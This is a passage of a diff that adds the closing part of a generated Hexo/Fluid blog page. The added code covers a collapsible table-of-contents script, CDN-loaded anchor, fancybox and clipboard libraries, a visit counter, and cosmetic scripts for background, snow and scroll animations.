+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://events.vercount.one/js?i=/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<!-- 全屏背景 -->
+<script src="/js/background.js?v=1788084129717"></script>
+
+<!-- 落雪动画 -->
+<script src="/js/snow.js?v=1788084129717"></script>
+
+<!-- 签名动画 -->
+<script src="/js/sign.js?v=1788084129717"></script>
+<link rel="stylesheet" href="/css/sign.css?v=1788084129717">
+
+<!-- 标签页标题变化 -->
+<script src="/js/title.js?v=1788084129717"></script>
+
+<!-- 文章卡片滑入动画 -->
+<script src="/js/scrollAnimation.js?v=1788084129717"></script>
+<link rel="stylesheet" href="/css/scrollAnimation.css?v=1788084129717">
+
+<!-- 网站运行时间 -->
+<script src="/js/time-insert.js?v=1788084129717"></script>
+  <!-- hexo injector body_end end --></body>
+</html>
